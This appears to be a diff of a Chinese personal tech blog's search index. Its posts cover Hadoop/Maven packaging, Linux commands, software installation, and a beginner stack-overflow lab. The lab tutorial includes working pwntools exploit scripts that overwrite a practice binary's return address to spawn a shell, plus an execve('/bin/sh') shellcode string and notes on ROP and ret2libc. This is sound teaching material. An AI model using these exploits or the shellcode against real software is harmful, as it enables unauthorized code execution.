+<li>step3: 将项目导出jar包，具体步骤见参考文献[2]。不要选择empty.</li>
+<li>step4: 将jar包上传至linux系统上。</li>
+<li>step5: 运行命令执行jar包</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop jar hadoopEnvTest.jar</span><br><span class="line">hadoop jar hadoopEnvTest.jar isExist</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>:使用这种jar包运行方式的时候，需要在命令后面指定主类方法，不然出现错误<code>RunJar jarFile [mainClass] args...</code></p>
+<blockquote>
+<p>build -&gt; build artifacts -&gt; rebuilds 重新生成jar包。<br>Tool -&gt; deployment -&gt; configuration -&gt; stfp配置<br>右击jar -&gt; deployment -&gt; unload..</p>
+</blockquote>
+<h2 id="使用maven开发"><a href="#使用maven开发" class="headerlink" title="使用maven开发"></a>使用maven开发</h2><ul>
+<li>step1: 新建maven工程。</li>
+<li>step2: 修改pom文件，见附录1</li>
+<li>step3: 导出jar包，参考文献[2]</li>
+<li>step4: jar包上传至linux系统。</li>
+<li>step5: 运行jar包，同普通项目一样。</li>
+</ul>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="附录1"><a href="#附录1" class="headerlink" title="附录1"></a>附录1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;groupId&gt;com.yijun.hadoopMaven&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hadoopEnvMav&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;hadoop.version&gt;2.7.1&lt;/hadoop.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.8.2&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-hdfs&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>src/main/resources</code>目录下，新建一个文件，命名为<code>log4j.properties</code>，文件中填入如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log4j.rootLogger=INFO, stdout</span><br><span class="line">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern=%d %p [%c] - %m%n</span><br><span class="line">log4j.appender.logfile=org.apache.log4j.FileAppender</span><br><span class="line">log4j.appender.logfile.File=target/spring.log</span><br><span class="line">log4j.appender.logfile.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern=%d %p [%c] - %m%n</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.shiyanlou.com/courses/237/learning/?id=1032" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/237/learning/?id=1032</a><br>[2] <a href="https://blog.csdn.net/ouyang111222/article/details/73105086" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/73105086</a></p>
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>hadoop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linuxcmd</title>
+    <url>/2019/11/14/linuxcmd/</url>
+    <content><![CDATA[<p>本人常用的linux命令收藏</p>
+<a id="more"></a>
+<h1 id="0x00工具类"><a href="#0x00工具类" class="headerlink" title="0x00工具类"></a>0x00工具类</h1><h2 id="查看二进制文件od"><a href="#查看二进制文件od" class="headerlink" title="查看二进制文件od"></a>查看二进制文件<code>od</code></h2><p>不加任何参数是以八进制形式输出二进制</p>
+<h3 id="十六进制查看"><a href="#十六进制查看" class="headerlink" title="十六进制查看"></a>十六进制查看</h3><p>加上x是以十六进制输出，小端形式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">od -x text</span><br><span class="line">od -w1 -x text #每列只输出一个</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看执行程序的所有者"><a href="#查看执行程序的所有者" class="headerlink" title="查看执行程序的所有者"></a>查看执行程序的所有者</h2><p><code>whoami</code><br>可以查看运行程序是哪一个所属组权限，即查看euid。</p>
+<h1 id="0x01权限类"><a href="#0x01权限类" class="headerlink" title="0x01权限类"></a>0x01权限类</h1><h2 id="root权限的setuid"><a href="#root权限的setuid" class="headerlink" title="root权限的setuid"></a>root权限的setuid</h2><p>setuid是系统的一个标志位，可执行性文件设置setuid位后，操作系统会赋予文件所有者的权限。<br>设置方法<code>chmod u+s fileName</code>或者<code>chmod 4755 fileName</code></p>
+<h1 id="0x02系统调用"><a href="#0x02系统调用" class="headerlink" title="0x02系统调用"></a>0x02系统调用</h1><h2 id="execve函数"><a href="#execve函数" class="headerlink" title="execve函数"></a>execve函数</h2><p>函数原型：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code><br>头文件：<code>#include &lt;unistd.h&gt;</code><br>用法：</p>
+<blockquote>
+<p>filename：程序所在的路径<br>argv：传递给程序的参数，数组指针argv必须以程序(filename)开头，NULL结尾<br>envp：传递给程序的新环境变量，无论是shell脚本，还是可执行文件都可以使用此环境变量，必须以NULL结尾</p>
+</blockquote>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char *data[2];</span><br><span class="line">char sh[]= &quot;/bin/sh&quot;;</span><br><span class="line">data[0] =sh;</span><br><span class="line">data[1] = NULL;</span><br><span class="line">execve(sh, data, NULL);</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03实用脚本"><a href="#0x03实用脚本" class="headerlink" title="0x03实用脚本"></a>0x03实用脚本</h1><h2 id="循环移动文件"><a href="#循环移动文件" class="headerlink" title="循环移动文件"></a>循环移动文件</h2><p><code>for i in *.src; do mv $i src/$i; done</code><br>移动所有.src结尾的文件到src目录下面</p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>gcc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack-overflow-eg</title>
+    <url>/2019/11/04/stack-overflow-eg/</url>
+    <content><![CDATA[<p>栈溢出基础入门实例<br>这是一个简单的栈溢出实例，来自i春秋。</p>
+<a id="more"></a>
+<p>前一篇文章<a href="https://onecoderman.github.io/2019/10/30/docker-IDAPro/#more" target="_blank" rel="noopener">docker-IDAPro</a></p>
+<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><p>这是一个32位的程序。<code>x86</code>的通用寄存器是<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>ebp</code>,<code>esp</code>,<code>esi</code>,<code>edi</code><br>x86体系调用过程见[4]</p>
+<h2 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h2><p><code>call function</code>在<code>x86</code>下的功能</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push IP  #保存返回地址</span><br><span class="line">mov IP, [function]  #修改IP</span><br></pre></td></tr></table></figure>
+
+<h2 id="leave指令"><a href="#leave指令" class="headerlink" title="leave指令"></a>leave指令</h2><p><code>leave</code>指令是调整栈帧的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h2><p><code>x86</code>下是修改EIP用的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-函数调用过程分析"><a href="#0x01-函数调用过程分析" class="headerlink" title="0x01 函数调用过程分析"></a>0x01 函数调用过程分析</h1><p>将<code>hello</code>文件上传到linux系统，参考文献[3]。<br>下面是<code>hello</code>函数的伪代码<br><img src="/images/stack-overflow-eg/14.png" alt="pic"><br>在x86下函数调用是cdecl调用约定，参数从右到左以此压入栈。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb hello</span><br><span class="line">(gdb) b main</span><br><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>
+
+<h2 id="call-hello前的情况"><a href="#call-hello前的情况" class="headerlink" title="call hello前的情况"></a>call hello前的情况</h2><p><img src="/images/stack-overflow-eg/01.png" alt="pic"><br>此时的栈情况如下所示<br><img src="/images/stack-overflow-eg/08.png" alt="pic"></p>
+<h2 id="进入hello函数"><a href="#进入hello函数" class="headerlink" title="进入hello函数"></a>进入hello函数</h2><p><img src="/images/stack-overflow-eg/02.png" alt="pic"><br>调用<code>call</code>指令其实是<code>push IP  #保存返回地址</code>与<code>mov IP, [function]  #修改IP</code>两条指令<br>此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/09.png" alt="pic"><br><br><br>可以看一下hello函数的代码<br><img src="/images/stack-overflow-eg/03.png" alt="pic"></p>
+<h2 id="产生新的栈帧"><a href="#产生新的栈帧" class="headerlink" title="产生新的栈帧"></a>产生新的栈帧</h2><p><img src="/images/stack-overflow-eg/04.png" alt="pic"><br>通过函数的前两句指令，新的栈帧产生，此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/10.png" alt="pic"><br>然后在栈帧中进行函数的功能操作，可以随着函数的执行，栈一直在生长(sp会减小)，停留下来看read函数的执行。</p>
+<h2 id="read函数的情形"><a href="#read函数的情形" class="headerlink" title="read函数的情形"></a>read函数的情形</h2><p><img src="/images/stack-overflow-eg/05.png" alt="pic"><br>可以看到<code>read</code>执行的时候，读取的值保持在地址<code>0xffffd656</code>处。<br>栈一直生长，此时看到的栈如下所示<br><img src="/images/stack-overflow-eg/11.png" alt="pic"></p>
+<h2 id="leave前，退出hello函数前的情况"><a href="#leave前，退出hello函数前的情况" class="headerlink" title="leave前，退出hello函数前的情况"></a>leave前，退出hello函数前的情况</h2><p><img src="/images/stack-overflow-eg/06.png" alt="pic"><br>hello函数主体功能已经完成，需要销毁栈帧，回退到调用之前的栈状态。<br>此时的栈情况如下<br><img src="/images/stack-overflow-eg/12.png" alt="pic"></p>
+<h2 id="leave后"><a href="#leave后" class="headerlink" title="leave后"></a>leave后</h2><p>leave指令的作用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/stack-overflow-eg/07.png" alt="pic"><br>此时栈的情况如下<br><img src="/images/stack-overflow-eg/13.png" alt="pic"><br>可以看到，此时的栈的bp已经回到了调用之前的栈底，栈顶元素就是返回地址。<br>然后执行<code>pop ip</code>修改IP位当前栈顶元素，从而实现程序跳转到原来的<code>main</code>函数。<br>然后可以进行出栈操作可以恢复现场，这些参数存储着原来的值。</p>
+<h1 id="0x01-漏洞利用原理"><a href="#0x01-漏洞利用原理" class="headerlink" title="0x01 漏洞利用原理"></a>0x01 漏洞利用原理</h1><p>从read函数情形那里可以看出，输入的数据保存在地址<code>0xffffd656</code>处。而保存的返回IP地址在<code>0xffffd66c</code>,我们只要覆盖<code>0xffffd66c</code>处的值（这里是保存的IP值，修改之后便能跳转）。<br>两者的距离是<code>0xffffd66c</code>-<code>0xffffd656</code>=<code>0x16</code><br>所以输入<code>A</code>*0x16+一个地址就能达到覆盖返回地址的值，实现程序跳转。<br>这个程序在地址<code>0x0804846B</code>处有一个后门，是一个叫<code>getshell</code>的函数<br><img src="/images/stack-overflow-eg/15.png" alt="pic"></p>
+<h1 id="0x02-pwntools与docker环境的复现"><a href="#0x02-pwntools与docker环境的复现" class="headerlink" title="0x02 pwntools与docker环境的复现"></a>0x02 pwntools与docker环境的复现</h1><ul>
+<li><p>step1: 端口转发</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw,echo=0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step2: 本地主机上打开python<br>依次执行下面命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&quot;172.17.0.2&quot;,10001)</span><br><span class="line">payload=22*&apos;A&apos;+p32(0x804846b)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step3: 获得shell<br>可以看到如下情况<br><img src="/images/stack-overflow-eg/16.png" alt="pic"></p>
+</li>
+</ul>
+<h1 id="0x03-pwntools在本地主机复现"><a href="#0x03-pwntools在本地主机复现" class="headerlink" title="0x03 pwntools在本地主机复现"></a>0x03 pwntools在本地主机复现</h1><p>这里不通过端口转发，直接在本地环境上实验<br>在本地主机上写上如下脚本<code>exploit.py</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./hello&apos;)</span><br><span class="line">payload = &apos;A&apos;*22+p32(0x0804846b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本<code>python exploit.py</code><br>可以看到如下情况<br><img src="/images/stack-overflow-eg/17.png" alt="pic"></p>
+<h1 id="0x04-python输出十六进制字符"><a href="#0x04-python输出十六进制字符" class="headerlink" title="0x04 python输出十六进制字符"></a>0x04 python输出十六进制字符</h1><p>这里的python是值python2，python3会因为编码默认位utf-8编码，所以不会产生预期的结果，需要设置编码。</p>
+<h2 id="输出十六进制字符"><a href="#输出十六进制字符" class="headerlink" title="输出十六进制字符"></a>输出十六进制字符</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;print(22*&quot;A&quot;+&quot;\x6b\x84\x04\x08&quot;)&apos; &gt; text</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，这种方式末尾有一个换行符</strong><br>因此，可以使用下面的<code>gen.py</code>生产我们的十六进字符，<code>f.write()</code>不会添加自动换行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f = open(&apos;text&apos;,&apos;w&apos;)</span><br><span class="line">s = &quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>使用命令运行<code>python gen.py</code>就可以得到我们的text文件。<br>可以进行<code>(gdb) run &lt; text</code>调试</p>
+<h2 id="以十六进制格式查看文件"><a href="#以十六进制格式查看文件" class="headerlink" title="以十六进制格式查看文件"></a>以十六进制格式查看文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">f = open(&apos;text&apos;,&apos;rb&apos;)</span><br><span class="line">n = 0;</span><br><span class="line">s = f.read(1)</span><br><span class="line">while s:</span><br><span class="line">        byte = ord(s)</span><br><span class="line">        n = n+1</span><br><span class="line">        print(&apos;0x%02x,&apos;%(byte),end=&apos;&apos;)</span><br><span class="line">        if n%16==0:</span><br><span class="line">                print(&apos;&apos;)</span><br><span class="line">        s = f.read(1)</span><br><span class="line">print(&apos;\n\ntotal bytes: %d&apos;%n)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05转发调试"><a href="#0x05转发调试" class="headerlink" title="0x05转发调试"></a>0x05转发调试</h1><p>这个是为了方便输入一些不可见字符，方便gdb调试。</p>
+<ul>
+<li>step1：将程序的IO端口利用socat进行转发</li>
+<li>step2: 使用<code>gdb attach pid</code>进行附加调试</li>
+<li>step3: 使用pwntools进行调试，同0x02。</li>
+</ul>
+<h1 id="0x06拓展-栈溢出利用的技巧"><a href="#0x06拓展-栈溢出利用的技巧" class="headerlink" title="0x06拓展_栈溢出利用的技巧"></a>0x06拓展_栈溢出利用的技巧</h1><p>我们主要的目标是覆盖返回地址，控制程序流程。这里的知识笔记来自于参考文献[6]。<br>一些常用的覆盖技术如下：<br>修改栈中的返回地址，指向栈中的一段数据指令（shellcode）<br>修改栈中的返回地址，指向内存中已有的某个函数（return2libc）<br>修改栈中的返回地址，其指向内存中已有的一段指令（ROP）<br>修改某个被调用函数的地址，其指向另一个函数（hijack GOT）</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>前提：栈上的数据有执行权限。<br>这种利用方法的栈情况如下(图片来源于参考文献[6])，红色部分就是要构造的payload。<br><img src="/images/stack-overflow-eg/18.jpg" alt="pic18"><br>这里有两个关键的问题需要解决：</p>
+<ul>
+<li>Q1:覆盖到返回地址之前的padding1长度如何获知？<br>A1:使用gdb调试工具查看汇编代码获得，本文上面部分0x01；运行过程中输入不同的”AAA”进行试探；使用idaPro反汇编功能。</li>
+<li>Q2：shellcode的起始地址如何确定？<br>A1:padding2填充若干的”\x90”(nop)，增大命中几率。</li>
+</ul>
+<h2 id="return2libc"><a href="#return2libc" class="headerlink" title="return2libc"></a>return2libc</h2><p>一个简单的示例是条用system()函数打开shell，system(“/bin/sh)。<br><img src="/images/stack-overflow-eg/19.jpg" alt="pic18"><br>padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址[6]。</p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>目标函数在内存内无法找到，在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。<br>执行某段指令(称为“gadget”)。<br><img src="/images/stack-overflow-eg/20.jpg" alt="pic18"><br>上图是一个当个gadget数据的情况。<br>连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。[7]<br><img src="/images/stack-overflow-eg/21.jpg" alt="pic18"></p>
+<blockquote>
+<p>对于前置的docker环境搭建和调试代码，可参考文献[2]</p>
+</blockquote>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q</a><br>[2] <a href="https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/" target="_blank" rel="noopener">https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/</a><br>[3] <a href="https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw" target="_blank" rel="noopener">https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw</a>   环境和代码（porf）[key borad -1]<br>[4] <a href="https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg</a><br>[5] <a href="https://blog.csdn.net/jctian000/article/details/85099980" target="_blank" rel="noopener">https://blog.csdn.net/jctian000/article/details/85099980</a> 读取十六进代码<br>[6] <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25816426</a><br>[7] <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SciPy-basic</title>
     <url>/2019/11/03/SciPy-basic/</url>
     <content><![CDATA[<p>SciPy科学计算基础<br>用于数学、科学和工程的开源库，其集成了统计、优化、线性代数、傅立叶变换、信号和图像处理，ODE 求解器等模块<br><a href="https://www.scipy.org/docs.html" target="_blank" rel="noopener">官网</a></p>
@@ -50,9 +973,9 @@
         <category>Numpy</category>
       </categories>
       <tags>
+        <tag>Python</tag>
         <tag>Numpy</tag>
         <tag>SciPy</tag>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -179,8 +1102,8 @@
         <category>Numpy</category>
       </categories>
       <tags>
-        <tag>Numpy</tag>
         <tag>Python</tag>
+        <tag>Numpy</tag>
         <tag>seaborn</tag>
       </tags>
   </entry>
@@ -469,6 +1392,7 @@
  <tr><td>F9</td><td>运行程序</td></tr>
 </table>
 
+<p><strong>动态调试的时候，如果遇到程序输入，可以在<code>linux_server</code>运行的接口输入字符</strong></p>
 <h2 id="3-ubuntu16-04安装pwntools模块"><a href="#3-ubuntu16-04安装pwntools模块" class="headerlink" title="3.ubuntu16.04安装pwntools模块"></a>3.ubuntu16.04安装pwntools模块</h2><p><a href="https://docs.pwntools.com/en/stable/install.html" target="_blank" rel="noopener">官网链接</a><br>先升级setuptools</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -U setuptools</span><br></pre></td></tr></table></figure>
 
@@ -502,7 +1426,7 @@
 <h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://blog.csdn.net/asd413850393/article/details/101349924" target="_blank" rel="noopener">https://blog.csdn.net/asd413850393/article/details/101349924</a><br>[2] <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-04-05.Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94Ubuntu16.04.md" target="_blank" rel="noopener">https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-04-05.Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94Ubuntu16.04.md</a><br>[3] <span id="ref3"><a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank" rel="noopener">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></span><br>[4] <a href="https://zhuanlan.zhihu.com/p/71914632" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/71914632</a></p>
 ]]></content>
       <categories>
-        <category>tool</category>
+        <category>pwn</category>
       </categories>
       <tags>
         <tag>docker</tag>
@@ -510,10 +1434,11 @@
       </tags>
   </entry>
   <entry>
-    <title>languageEnvConf</title>
-    <url>/2019/10/28/languageEnvConf/</url>
-    <content><![CDATA[<h1 id="语言环境的安装和配置"><a href="#语言环境的安装和配置" class="headerlink" title="语言环境的安装和配置"></a>语言环境的安装和配置</h1><a id="more"></a>
-<h2 id="ubuntu16-04下的python3-7安装"><a href="#ubuntu16-04下的python3-7安装" class="headerlink" title="ubuntu16.04下的python3.7安装"></a>ubuntu16.04下的python3.7安装</h2><blockquote>
+    <title>SoftWareInstall</title>
+    <url>/2019/10/28/SoftWareInstall/</url>
+    <content><![CDATA[<p> 软件环境的安装和配置</p>
+<a id="more"></a>
+<h1 id="0x00-ubuntu16-04下的python3-7安装"><a href="#0x00-ubuntu16-04下的python3-7安装" class="headerlink" title="0x00 ubuntu16.04下的python3.7安装"></a>0x00 ubuntu16.04下的python3.7安装</h1><blockquote>
 <p>ubuntu16.04默认安装有python3.5和python2.7<br>安装路径在<code>/usr/local/lib</code>下</p>
 </blockquote>
 <p>可以通过如下命令查看python的指向</p>
@@ -560,10 +1485,50 @@
 
 </li>
 </ul>
+<h1 id="0x01-ubuntu16-04-Java环境配置"><a href="#0x01-ubuntu16-04-Java环境配置" class="headerlink" title="0x01 ubuntu16.04 Java环境配置"></a>0x01 ubuntu16.04 Java环境配置</h1><ol>
+<li>首先下载jdk文件：eg:<code>jdk-8u181-linux-x64.tar.gz</code></li>
+<li>新建目录<code>/usr/lib/jdk</code></li>
+<li>解压至该目录</li>
+<li>配置环境变量<br>这里选择配置<code>/etc/profile</code>文件<br>在末尾添加如下代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set java env</span><br><span class="line">export JAVA_HOME=/usr/lib/jdk/jdk1.8.0_202</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre    </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib    </span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>5 使配置生效<code>source /etc/profile</code><br>6 测试<code>java -version</code></p>
+<h1 id="0x02-ubuntu16-04-maven安装"><a href="#0x02-ubuntu16-04-maven安装" class="headerlink" title="0x02 ubuntu16.04 maven安装"></a>0x02 ubuntu16.04 maven安装</h1><ol>
+<li><p>下载maven二进制文件：eg:<code>apache-maven-3.6.3-bin.tar.gz</code></p>
+</li>
+<li><p>解压到目录<code>/opt/maven</code>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置maven环境变量<br><code>vim /etc/profile</code><br>添加如下代码：<br>使之生效<code>source /etc/profile</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export M2_HOME=/opt/maven/apache-maven-3.5.0</span><br><span class="line">export CLASSPATH=$CLASSPATH:$M2_HOME/lib</span><br><span class="line">export PATH=$PATH:$M2_HOME/bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试<br><code>mvn -v</code></p>
+</li>
+<li><p>修改镜像地址<br><code>vim  /opt/maven/apache-maven-3.5.0/conf/settings.xml</code><br>修改镜像为阿里云</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">    &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">    &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">    &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="0x03-ubuntu16-04-tomcat安装"><a href="#0x03-ubuntu16-04-tomcat安装" class="headerlink" title="0x03 ubuntu16.04 tomcat安装"></a>0x03 ubuntu16.04 tomcat安装</h1><ol>
+<li><p>下载tomcat二进制文件<br><a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">https://tomcat.apache.org/download-70.cgi</a></p>
+</li>
+<li><p>移动<code>apache-tomcat-7.0.99.tar.gz</code>并解压到<code>/opt/tomcat</code>目录下</p>
+</li>
+<li><p>配置tomcat环境变量<br><code>vim /etc/profile</code><br>添加如下代码：<br>使之生效<code>source /etc/profile</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CATALINA_HOME=/opt/tomcat/apache-tomcat-7.0.99</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置utf-8字符集<br>解决中文乱码<br>进入tomcat的conf文件夹，编辑<code>server.xml</code><br>在配置端口的那个位置加入URIEncoding的选项。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; URIEncoding=&quot;UTF-8&quot; /&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试启动<br>进入bin目录<br>执行<code>./startup.sh</code><br>可以访问到tomcat：<code>localhost:8080</code></p>
+</li>
